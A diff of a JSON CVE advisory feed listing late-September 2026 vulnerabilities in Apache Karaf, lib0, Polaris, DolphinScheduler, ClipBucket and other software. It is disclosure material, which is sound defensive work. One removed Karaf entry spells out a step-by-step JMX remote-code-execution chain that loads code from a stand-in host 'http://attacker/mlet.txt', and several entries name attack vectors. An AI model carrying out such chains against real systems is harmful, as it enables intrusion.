@@ -1,143 +1,143 @@
 {
-  "totalResults": 2653,
+  "totalResults": 2873,
   "items": [
     {
-      "id": "CVE-2026-84154",
-      "published": "2026-09-29T08:17:21.297",
-      "description": "A Code Injection vulnerability affecting GEOVIA Geospatial Data Manager from Release 3DEXPERIENCE R2024x through Release 3DEXPERIENCE R2026x could allow an attacker to execute arbitrary code on the server.",
-      "severity": "CRITICAL",
-      "score": 9.9
-    },
-    {
-      "id": "CVE-2026-91012",
-      "published": "2026-09-29T09:17:09.087",
-      "description": "org.apache.karaf.config.core.impl.ConfigRepositoryImpl#update(pid, properties),\nwhich backs the \"config\" MBean and the config:* shell commands, derives the file\nit writes a configuration to from caller-supplied input without checking that\nthe result stays inside ${karaf.etc}:\n\n  *  if the submitted property map contains a felix.fileinstall.filename entry, that value is turned directly into a File (getCfgFileFromProperty), so it can point to any absolute path the Karaf process can write to;\n  *  otherwise the configuration PID is concatenated verbatim into the target file name (generateConfigFilename(): new File(karaf.etc, pid + \".cfg\")), so a PID containing \"..\" segments resolves outside ${karaf.etc}. createFactoryConfiguration() has the same issue via the factory PID/alias.\n\n\nBoth code paths are reachable by any caller holding the \"manager\" role under Karaf's shipped command/JMX ACL (org.apache.karaf.command.acl.conf.cfg: \"update = manager\"). Such a user can therefore write attacker-controlled content to any file the Karaf process can write, including files the same ACL otherwise reserves to \"admin\" (etc/users.properties, etc/*.acl.*.cfg, etc/org.apache.karaf.management.cfg, and similar), allowing a manager-role user to grant themselves the admin role or otherwise take over the container.\n\n\n\n\n\n\nConfigMBeanImpl.install() and the config:install shell command already guarded the equivalent risk on their own code path with a finalname.contains(\"..\") string check, but that check does not stop absolute paths or symlink-based escapes, and it was never applied to ConfigRepositoryImpl.update() / createFactoryConfiguration() at all.",
-      "severity": "CRITICAL",
-      "score": 9.8
-    },
-    {
-      "id": "CVE-2026-91048",
-      "published": "2026-09-29T09:17:10.193",
-      "description": "The jdbc shell command scope shipped no org.apache.karaf.command.acl.jdbc.cfg. Karaf's command guard (SecuredSessionFactoryImpl) treats a command with no matching ACL rule as allowed, so any authenticated shell session (including one holding only the viewer role) could run every jdbc:* command. jdbc:ds-create stores a fully attacker-controlled JDBC URL into a pax-jdbc-config factory Configuration with no validation. pax-jdbc-config reactively turns that into a live DataSource. Several JDBC drivers run code or SQL at connection time based on URL parameters (e.g. H2 INIT=RUNSCRIPT), so a viewer-level shell user could reach arbitrary code execution, bypassing the admin-role gate that already protects shell:exec. This is a privilege-escalation-to-RCE chain, not merely an \"admin misconfiguration\".\n\n\nThe same applies to jms:* shell commands.",
-      "severity": "CRITICAL",
-      "score": 9.8
-    },
-    {
-      "id": "CVE-2026-92142",
-      "published": "2026-09-29T09:17:10.497",
-      "description": "Apache Karaf exposes a JMX MBeanServer guarded by KarafMBeanServerGuard, which enforces role-based access control (RBAC) on MBean operations invoked over the remote JMX connector (RMI registry/server, enabled by default on ports 1099 and 44444). The guard is implemented as a java.lang.reflect.Proxy around the MBeanServer, and only forwards a fixed list of operation names to the RBAC check, defined in MBeanInvocationHandler#guarded:\n\n\n  private final List<String> guarded = Collections.unmodifiableList( Arrays.asList(\"invoke\", \"getAttribute\", \"getAttributes\", \"setAttribute\", \"setAttributes\"));\n\n\n\n\nThe MBean lifecycle operations MBeanServer#createMBean, #registerMBean and #unregisterMBean are not in this list. Calls to these methods are forwarded directly to the underlying MBeanServer with no role check at all, regardless of the roles configured in etc/jmx.acl.*.cfg.\n\n\n\n\nAs a result, any user who can authenticate to the JMX endpoint, including a user holding only the least-privileged \"viewer\" role, can call createMBean() to instantiate an arbitrary class as a MBean, and unregisterMBean() to remove it again afterwards, with no authorization check and no audit log entry (logging in KarafMBeanServerGuard only occurs on the RBAC-denial path, which this bypass never reaches).\n\n\n\n\nThis is significant because javax.management.loading.MLet, a standard JDK MBean, can be instantiated this way. MLet acts as a remote classloader: its getMBeansFromURL(URL) operation fetches an MLet text file from an attacker-controlled URL and instantiates and registers the classes it lists as new MBeans in the target JVM. Reaching this operation still goes through KarafMBeanServerGuard's existing \"invoke\" check, but the default etc/jmx.acl.cfg grants the \"viewer\" role to any method name matching the wildcard rule \"get* = viewer\", a heuristic intended for read-only getters. Because \"getMBeansFromURL\" happens to start with \"get\", it also matches that rule, so a default installation grants \"viewer\" callers permission to invoke it without any Karaf-specific ACL naming MLet at all. Combined with the createMBean gap, this gives a \"viewer\"-role JMX client a path to remote code execution to the Karaf JVM:\n\n  *  Authenticate to JMX as any user with any role (e.g. \"viewer\").\n  *  mbs.createMBean(\"javax.management.loading.MLet\", objectName) is not in GUARDED_OPERATIONS, no RBAC check, MLet is instantiated and registered.\n  *  mbs.invoke(objectName, \"getMBeansFromURL\", new Object[]{\"http://attacker/mlet.txt\"}, ...) is guarded, but the method name matches the default \"get* = viewer\" ACL rule, so permitted.\n  *  The remote .mlet file is fetched and its listed classes are loaded and registered as new MBeans, running attacker-supplied code in the Karaf JVM.\n  *  mbs.unregisterMBean(objectName) can be used to remove the MLet afterwards, also not in GUARDED_OPERATIONS, no RBAC check, no audit trail.\n\n\nThe fix adds createMBean, registerMBean and unregisterMBean to the guarded operation list, resolves required roles for them from the jmx.acl* configuration by ObjectName and (for createMBean/registerMBean) MBean class name, and ships default etc/jmx.acl.cfg entries restricting all three operations to the \"admin\" role. This allows deployments to also write class-name-specific rule, e.g.:\n\n\n\n\ncreateMBean(java.lang.String)[/javax\\.management\\.loading\\..*/] = admin\n\n\n\n\nApache Karaf users should upgrade to 4.4.12 or 4.5.0 or later, once released, as soon as possible. Until an upgrade is available, restrict network access to the JMX RMI registry/server ports (1099/44444) to trusted hosts, or avoid issuing any non-\"admin\" JMX credentiels.",
+      "id": "CVE-2026-102360",
+      "published": "2026-09-29T14:17:20.117",
+      "description": "A missing bounds check in the binary decoder in lib0, versions 0.2.1-0.2.117 and earlier and 1.0.0-rc.32 and earlier, lets any unauthenticated remote peer read adjacent process memory and receive it back. `readUint8Array` never compares the wire-supplied length against the decoder's own view, so one over-long length prefix returns whatever the host process allocated next: other tenants' document content, personal data, and live bearer session tokens**, recovered in full and at will. An attacker who can supply bytes to a lib0 decoder which means any peer that can open a socket, including before authentication reads adjacent process memory and, where the consumer echoes, stores or re-serves the decoded value, receives it back. This is patched in version 0.2.118 and 1.0.0-rc.33.",
       "severity": "HIGH",
-      "score": 8.8
+      "score": 8.6
     },
     {
-      "id": "CVE-2026-86158",
-      "published": "2026-09-29T07:16:35.520",
-      "description": "Missing authentication in the local .NET backend (Fiddler.WebUi) of Progress Software Fiddler Everywhere 8.0.2 allows a local unauthenticated attacker to mint OAuth tokens and read the machine-in-the-middle root certificate through an unauthenticated localhost HTTP and SignalR RPC channel.",
+      "id": "CVE-2026-102521",
+      "published": "2026-09-29T14:17:20.393",
+      "description": "The decoder in `readFromDataView` in lib0 before 0.2.119 can be tricked into reading more than it should from a buffer. The vulnerability allows reading past the decoders' view, thus exposing adjacent process memory. This can be anything that is currently in the head, for example credentials or logs. This is similar to but different from GHSA-r5c8-rf4w-qrq8.",
       "severity": "HIGH",
-      "score": 7.7
+      "score": 8.6
     },
     {
-      "id": "CVE-2026-91085",
-      "published": "2026-09-29T09:17:10.347",
-      "description": "Apache Karaf's shell/SSH command security is enforced by per-scope ACL configuration files (etc/org.apache.karaf.command.acl.<scope>.cfg). SecuredSessionFactoryImpl.checkSecurity() resolves the roles required for an invocation and, when no ACL rule matches the command, fails open: ACLConfigurationParser.Specificity.NO_MATCH sets passCheck = true. The safety valve for this, karaf.secured.command.compulsory.roles, ships commented out in etc/system.properties, so an unmatched command is allowed for any authenticated user.\n\n\nThe shipped org.apache.karaf.command.acl.config ACL (assemblies/features/standard/src/main/feature/feature.xml, mirrored into instance/.../etc/org.apache.karaf.command.acl.config.cfg) has no install entry. It restricts delete to admin, restricts edit/property-*/update on the jmx.acl.*, org.apache.karaf.command.acl.* and org.apache.karaf.service.acl.* PIDs to admin, and allows manager for everything else, but config:install was simply unmatched, and therefore allowed for any authenticated user, including one holding only the viewer role.\n\n\n\n\nconfig:install <url> <finalname> fetches url and writes it into ${karaf.etc} as finalname. It calls PathUtils.checkWithin() to block .. traversal outside karaf.etc, but that folder holds every security-relevant file Karaf ships: users.properties, keys.properties, host.key, and all org.apache.karaf.*.acl.* files, including the very ACL file that (mis)governs this command. With -o/--override, an existing file is overwritten with attacker-controlled bytes fetched from an arbitrary URL.\n\n\n\n\nBecause felix.fileinstall.dir = ${karaf.etc} (etc/config.properties), Felix FileInstall also watches and reloads any .cfg file dropped there, closing the loop without requiring a restart.\n\n\n\n\nBy contrast, bundle:install, feature:install and kar:install are all admin-only in their own ACLs, and config:delete is admin in this same ACL, config:install was the outlier.\n\nMitigationAdd install = admin in etc/org.apache.karaf.command.acl.config.cfg (create the file is absent), and/or set karaf.secured.command.compulsory.roles=admin in etc/system.properties (and restart) to make unmatched commands fail closed by default.",
+      "id": "CVE-2026-97395",
+      "published": "2026-09-29T14:17:22.020",
+      "description": "Apache Polaris allows an authenticated principal with permission to create or update Iceberg table properties to set FileIO client settings such as s3.endpoint in table metadata.\n\n\nIn versions < 1.8.0, when Polaris performs server-side Iceberg operations, including commits and purges, it may use those settings to construct its (server-side) FileIO client. If the catalog storage configuration does not override the endpoint, Polaris can send storage requests to a host chosen by the table writer, using credentials scoped to the operation.\n\n\n\n\nThis can redirect server-side storage traffic and expose request authentication material to the chosen endpoint. Deployments are affected when table writers are not trusted to configure server-side storage endpoints.",
+      "severity": "HIGH",
+      "score": 8.1
+    },
+    {
+      "id": "CVE-2026-102566",
+      "published": "2026-09-29T15:17:18.003",
+      "description": "CTranslate2 before 4.8.1 contains a heap-based buffer overflow in the binary model loader that fails to validate payload length against allocated buffer size. Attackers can craft malicious model files with oversized payload lengths to write past heap allocation boundaries, causing crashes or arbitrary code execution.",
+      "severity": "HIGH",
+      "score": 7.8
+    },
+    {
+      "id": "CVE-2026-86450",
+      "published": "2026-09-29T14:17:21.763",
+      "description": "Insertion of sensitive information into sent data vulnerability in Parla Auto Automotive Trading Limited Company DetaWix Mobile Web Portal allows Accessing Functionality Not Properly Constrained by ACLs.\n\nThis issue affects DetaWix Mobile Web Portal: before v1.0.19.",
+      "severity": "HIGH",
+      "score": 7.5
+    },
+    {
+      "id": "CVE-2015-20122",
+      "published": "2026-09-29T15:17:11.023",
+      "description": "Seeyon A6 collaborative office automation platform contains an unauthenticated SQL injection vulnerability in the attach_ids parameter of the file attachment download endpoint that allows remote attackers to extract arbitrary database contents without prior authentication. Attackers can inject UNION-based SQL statements through the attach_ids request parameter in downloadAtt.jsp to retrieve sensitive information including credentials and system configuration data. Exploitation evidence was first observed by the Shadowserver Foundation on 2023-10-17.",
+      "severity": "HIGH",
+      "score": 7.5
+    },
+    {
+      "id": "CVE-2026-102491",
+      "published": "2026-09-29T15:17:17.813",
+      "description": "A vulnerability was identified in mahonelau kykms up to 8f130c2d85842d5b44caae78cc46d65e505949f7. The impacted element is the function QueryGenerator.doMultiFieldsOrder of the file QueryGenerator.java of the component SqlInjectionUtil. The manipulation of the argument column leads to sql injection. Remote exploitation of the attack is possible. The exploit is publicly available and might be used. This product follows a rolling release approach for continuous delivery, so version details for affected or updated releases are not provided. The vendor was contacted early about this disclosure but did not respond in any way.",
+      "severity": "HIGH",
+      "score": 7.3
+    },
+    {
+      "id": "CVE-2025-33207",
+      "published": "2026-09-29T15:17:12.293",
+      "description": "NVIDIA ConnectX and Bluefield contain a vulnerability in a control register, where a user with VF access could cause improper access control for the register interface by sending a malicious command to the firmware. A successful exploit of this vulnerability might lead to denial of service.",
       "severity": "MEDIUM",
-      "score": 6.3
+      "score": 6.8
     },
     {
-      "id": "CVE-2026-86157",
-      "published": "2026-09-29T07:16:35.377",
-      "description": "Exposure of privileged IPC functionality in Progress Telerik Fiddler Everywhere before version 8.2.0 allows a local, low-privileged attacker who can modify application launch parameters and persuade a user to start the application to replace the application UI or settings with attacker-controlled content. Successful exploitation could result in disclosure of OAuth authentication tokens, execution of locally accessible programs, or unauthorized modification of application-generated configuration files.",
+      "id": "CVE-2026-71899",
+      "published": "2026-09-29T14:17:21.190",
+      "description": "A missing authorization vulnerability exists in the `query-dynamic-sub-workflows` API of Apache DolphinScheduler. The API does not properly verify whether the authenticated user has permission to access the workflows being queried.\n\n\n\nAn authenticated user who does not have permission to access a specific project can invoke the API with parameters referencing workflows belonging to that project and retrieve workflow information. This allows users to access workflow data outside their authorized project scope, resulting in unauthorized information disclosure.\n\n\n\nThis issue affects Apache DolphinScheduler: from 3.2.0 before 3.4.3.\n\n\n\nUsers are recommended to upgrade to version 3.4.3, which fixes the issue.",
       "severity": "MEDIUM",
-      "score": 5.6
+      "score": 6.5
     },
     {
-      "id": "CVE-2026-102473",
-      "published": "2026-09-29T10:17:10.383",
-      "description": "A flaw was found in dash. When built without libc fnmatch, the internal pmatch() matcher implements * by unbounded recursion over candidate positions. A local user who can plant filenames, or otherwise feed that matcher, can make a short multi-star pattern such as *.*.*.*.*.tar.gz consume excessive CPU.",
+      "id": "CVE-2026-102567",
+      "published": "2026-09-29T15:17:18.177",
+      "description": "CTranslate2 before 4.8.1 contains an out-of-bounds heap read vulnerability in the binary model loader when deserializing string fields without null terminators. Attackers can craft malicious model files to trigger heap memory reads past buffer boundaries, causing crashes or disclosing adjacent heap memory contents.",
+      "severity": "MEDIUM",
+      "score": 6.1
+    },
+    {
+      "id": "CVE-2026-102568",
+      "published": "2026-09-29T15:17:18.443",
+      "description": "Pardus Parental Control before 0.7.0 contains an incorrect authorization vulnerability in the polkit policy that allows unprivileged local users to disable parental controls as root. Attackers can invoke PPCActivator.py with the --disable argument via pkexec to remove all restrictions including DNS filtering and application limits without authentication.",
       "severity": "MEDIUM",
       "score": 5.5
     },
     {
-      "id": "CVE-2026-10518",
-      "published": "2026-09-29T10:17:10.863",
-      "description": "GitLab has remediated an issue in GitLab EE affecting all versions from 17.9 before 19.2.7, 19.3 before 19.3.3, and 19.4 before 19.4.1 that under certain conditions could have allowed an authenticated user with guest-level permissions to read private security policy content they were not authorized to access due to improper authorization enforcement.",
+      "id": "CVE-2026-102569",
+      "published": "2026-09-29T15:17:18.757",
+      "description": "ClipBucket v5 through 5.5.3-#197 contains a time-based blind SQL injection vulnerability in the admin video edit function where the videoid parameter is concatenated into an UPDATE statement without proper escaping. An authenticated administrator with video_moderation permission can inject arbitrary SQL commands to extract or modify database contents.",
+      "severity": "MEDIUM",
+      "score": 5.5
+    },
+    {
+      "id": "CVE-2026-102570",
+      "published": "2026-09-29T15:17:18.917",
+      "description": "ClipBucket v5 through 5.5.3-#197 contains a time-based blind SQL injection vulnerability in the language update function where the language_id parameter is concatenated unescaped into the WHERE clause of an UPDATE statement. An authenticated administrator with basic_settings permission can inject arbitrary SQL payloads to extract or modify database contents.",
+      "severity": "MEDIUM",
+      "score": 5.5
+    },
+    {
+      "id": "CVE-2026-78214",
+      "published": "2026-09-29T14:17:21.530",
+      "description": "An authentication bypass vulnerability exists in the protection of Actuator endpoints. The application determines whether authentication is required by matching the incoming request path against protected Actuator paths. By sending a specially crafted request containing a percent-encoded path, a remote unauthenticated attacker can cause the security check to fail to recognize the request as targeting a protected endpoint.\n\n\n\nAs a result, the attacker may bypass authentication and access otherwise restricted Actuator endpoints. Successful exploitation may expose operational or configuration information and, depending on the enabled endpoints and application configuration, allow access to sensitive management functionality.\n\n\n\nThis issue affects Apache DolphinScheduler: before 3.4.3.\n\n\n\nUsers are recommended to upgrade to version 3.4.3, which fixes the issue.",
+      "severity": "MEDIUM",
+      "score": 5.3
+    },
+    {
+      "id": "CVE-2026-71897",
+      "published": "2026-09-29T14:17:20.947",
+      "description": "An improper authorization check in Apache DolphinScheduler allows an authenticated user to use the batch-copy and batch-move endpoints to operate on workflows in projects for which they lack the required permissions. This may allow the user to copy or move workflows from unauthorized projects.\n\n\n\nThis issue affects Apache DolphinScheduler: before 3.4.3.\n\n\n\nUsers are recommended to upgrade to version 3.4.3, which fixes the issue.",
       "severity": "MEDIUM",
       "score": 4.3
     },
     {
-      "id": "CVE-2026-102474",
-      "published": "2026-09-29T10:17:10.707",
-      "description": "A flaw was found in dash. The printf builtin reserves four bytes before converting a Unicode \\u or \\U escape, but the multi-byte token can need five or six bytes. A local user who can supply such an escape to dash printf or echo %b, including through dash -c and a positional argument, can write one or two bytes past that reservation.",
+      "id": "CVE-2026-71898",
+      "published": "2026-09-29T14:17:21.067",
+      "description": "An incorrect authorization check in Apache DolphinScheduler allows an authenticated user with only read permission for a project to modify a workflow instance in that project through the PUT /projects/{projectCode}/workflow-instances/{id} endpoint. The endpoint does not enforce the write permission required for this operation, allowing the user to make unauthorized changes to workflow instances.\n\n\n\nThis issue affects Apache DolphinScheduler: before 3.4.3.\n\n\n\nUsers are recommended to upgrade to version 3.4.3, which fixes the issue.",
       "severity": "MEDIUM",
-      "score": 4
+      "score": 4.3
     },
     {
-      "id": "CVE-2026-4523",
-      "published": "2026-09-29T10:17:11.613",
-      "description": "GitLab has remediated an issue in GitLab CE/EE affecting all versions from 15.11 before 19.2.7, 19.3 before 19.3.3, and 19.4 before 19.4.1 that under certain conditions could have allowed an unauthenticated user to read CI/CD job trace contents containing sensitive variable values due to improper authorization enforcement in the GraphQL API.",
-      "severity": "LOW",
-      "score": 3.7
+      "id": "CVE-2026-81569",
+      "published": "2026-09-29T14:17:21.650",
+      "description": "An improper authorization vulnerability exists in the handling of sub-workflow tasks. An authenticated user who does not have permission to access a target project can reference and invoke a workflow belonging to that project through a sub-workflow task.\n\n\n\nThe system does not properly verify whether the user has permission to execute the referenced workflow or access its project. As a result, the user can bypass project-level authorization controls and cause workflows in unauthorized projects to be executed.\n\n\n\nSuccessful exploitation may allow unauthorized execution of workflow tasks and access to the resources or data available to the target workflow.\n\n\n\nThis issue affects Apache DolphinScheduler: before 3.4.3.\n\n\n\nUsers are recommended to upgrade to version 3.4.3, which fixes the issue.",
+      "severity": "MEDIUM",
+      "score": 4.3
     },
     {
-      "id": "CVE-2026-101169",
-      "published": "2026-09-29T08:17:19.823",
-      "description": "In affected versions of Octopus Server, an authenticated user with permissions to edit an Environment or Project can set specifically crafted JSON content for the object. Insecure deserialization of this content allows the user to execute arbitrary code in the Octopus Server process.",
+      "id": "CVE-2026-4034",
+      "published": "2026-09-29T14:17:20.683",
+      "description": "Injection Vulnerability in Tibco Administrator version 5.13.0 & prior allows an authenticated user to submit specially crafted input through the web-based administration console.",
       "severity": "UNKNOWN",
       "score": null
     },
     {
-      "id": "CVE-2026-96428",
-      "published": "2026-09-29T09:17:10.687",
-      "description": "SQL Injection in the /WebAgenda/SMBAjaxAutoComplete.do API endpoint of Flowring Agentflow 4.0 version before 2025/08/08 allows remote attackers to execute arbitrary SQL commands via the words parameter.",
+      "id": "CVE-2026-102371",
+      "published": "2026-09-29T15:17:17.557",
+      "description": "In wsl-pro-service before 0.1.19ubuntu3, the service component which runs as root inside each WSL instance attaches the instance to Ubuntu Pro by executing the pro client with the Ubuntu Pro token passed as a command-line argument (pro attach <token>). On systems where /proc is mounted without process-hiding mitigations (such as hidepid), which is the default in WSL, an unprivileged local user or process in the same WSL instance can read the token from /proc/<pid>/cmdline while the attach process is running. The leaked token could then be used to attach other machines to the victim's Ubuntu Pro subscription and gain unauthorized access to Ubuntu Pro services.",
       "severity": "UNKNOWN",
       "score": null
     },
     {
-      "id": "CVE-2026-96429",
-      "published": "2026-09-29T09:17:10.917",
-      "description": "SQL Injection in the /WebAgenda/SMBAjaxConfigProcess.do API\nendpoint of Flowring Agentflow 4.0 version before 2025/08/08 allows\nremote attackers to execute arbitrary SQL commands via the id parameter.",
-      "severity": "UNKNOWN",
-      "score": null
-    },
-    {
-      "id": "CVE-2026-96430",
-      "published": "2026-09-29T09:17:11.047",
-      "description": "Exposed Dangerous Method or Function in the\n/WebAgenda/SQLWin.do API endpoint of Flowring Agentflow 4.0 version Before 2026/08/28 allows remote\nauthenticated users to execute arbitrary SQL commands via the sql parameter.",
-      "severity": "UNKNOWN",
-      "score": null
-    },
-    {
-      "id": "CVE-2026-96431",
-      "published": "2026-09-29T09:17:11.183",
-      "description": "Unrestricted Upload of File with Dangerous Type in the\n/WebAgenda/download/uploadFile.jsp API endpoint of Flowring Agentflow 4.0 version\nbefore 2023/03/24 allows remote authenticated users to execute arbitrary\nsystem commands via a malicious file.",
-      "severity": "UNKNOWN",
-      "score": null
-    },
-    {
-      "id": "CVE-2026-96440",
-      "published": "2026-09-29T09:17:11.317",
-      "description": "Improper Limitation of a Pathname to a Restricted\nDirectory（Path Traversal） in the /WebAgenda/download/uploadFile.jsp\nAPI endpoint of Flowring Agentflow 4.0 version before 2023/03/24 allows remote\nauthenticated users to write files to arbitrary locations outside the intended\nupload directory via the path parameter.",
-      "severity": "UNKNOWN",
-      "score": null
-    },
-    {
-      "id": "CVE-2026-11796",
-      "published": "2026-09-29T10:17:11.037",
-      "description": "Asset Suite allows unauthenticated users to access PropertiesReloadServlet, CacheFlushServlet, MetadataCacheFlushServlet and ResourceBundleReloadServlet, which could result in denial-of-service conditions affecting application availability. These servlets are designed to perform specific functions within production environment depending on how the Asset Suite application is configured.",
-      "severity": "UNKNOWN",
-      "score": null
-    },
-    {
-      "id": "CVE-2026-15390",
-      "published": "2026-09-29T10:17:11.237",
-      "description": "Das U-Boot with CONFIG_IP_DEFRAG=y parameter fails to clear IP reassembly state after delivering a complete datagram. An attacker who can deliver fragmented IP traffic can execute arbitrary code by sending duplicated last-fragment IP packets.\n\n\nThis issue was fixed in commit b1aec609bb5e0d08c25c888c91935287ab4ee5fa in version 2026.07.",
-      "severity": "UNKNOWN",
-      "score": null
-    },
-    {
-      "id": "CVE-2026-19547",
-      "published": "2026-09-29T10:17:11.410",
-      "description": "Ghostscript for Windows is vulnerable to local privilege escalation through PostScript resource file hijacking. Due to the application searching for PostScript resource files in predictable paths under C:\\\\gs\\\\ that do not exist by default on Windows installations, combined with Windows default ACLs allowing any authenticated user to create directories at the root of C:\\\\, an attacker who is an authenticated local user can create the expected directory structure and plant a malicious PostScript file. When any user or service subsequently runs Ghostscript, the planted file is automatically loaded and executed with the full privileges of the Ghostscript process. This results in full compromise of Ghostscript process context, as well as running arbitrary code on the machine with Ghostscript process privileges.\n\n\nThis issue was fixed in version 10.08.0.",
+      "id": "CVE-2026-22094",
+      "published": "2026-09-29T15:17:21.453",
+      "description": "The firmware for the EVbee DC-80 has a weak hardcoded root password, which allows attackers to login as root using the SSH daemon that is exposed to the network.",
       "severity": "UNKNOWN",
       "score": null
     }
